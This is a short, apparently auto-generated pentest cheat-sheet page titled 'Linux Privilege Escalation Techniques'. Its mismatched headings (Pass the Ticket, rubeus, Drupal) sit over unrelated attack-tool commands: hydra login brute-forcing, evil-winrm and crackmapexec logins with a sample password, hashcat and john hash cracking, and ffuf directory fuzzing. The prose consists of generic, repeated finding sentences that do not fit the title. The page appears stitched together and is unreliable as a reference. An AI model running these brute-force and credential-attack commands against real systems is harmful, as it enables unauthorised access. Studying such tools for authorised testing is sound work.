---
TitleSEO: "Linux Privilege Escalation Techniques | ZureFX"
TitlePost: "Linux Privilege Escalation Techniques"
Author: "ZureFX"
Description: "Personal notes on Linux Privilege Escalation Techniques. Quick reference for pentesting and CTF challenges."
Keywords: "cheatsheet, oscp, malware"
URL: "https://zurefx.github.io/notes/note-linux-privilege-escalation-techniques-891.html"
URL_IMAGES: ""
Date: "2025-06-24"
Tags: "Cheatsheet, OSCP, Malware"
Section: "notes"
Lang: "en"
main_img: "note-linux-privilege-escalation-techniques-891"
Permalink: "/notes/note-linux-privilege-escalation-techniques-891.html"
BtnLabel: "Read Notes"
Pick: 0
---
## Pass the Ticket

### GPP Password

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.108.73.247 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.117.216.128 -u administrator -p 'P@ssw0rd!'
```

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.39.137.9/FUZZ
```

- `Writable PATH`
- `nmap`
- `DCSync`

## rubeus

### Telnet

Command injection was possible through unsanitized user input in the search functionality. The target system was identified as running a vulnerable version of the service.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.115.192.220 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.13.129.187/FUZZ
```

## sharphound

### Drupal

> **Note:** Remote File Inclusion was identified as the primary attack vector in this scenario.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The application stored sensitive credentials in an unencrypted configuration file. Privilege escalation was possible due to misconfigured sudo permissions. The application stored sensitive credentials in an unencrypted configuration file. The backup files contained sensitive information that should not have been accessible. The scheduled task ran with elevated privileges and could be abused for escalation.
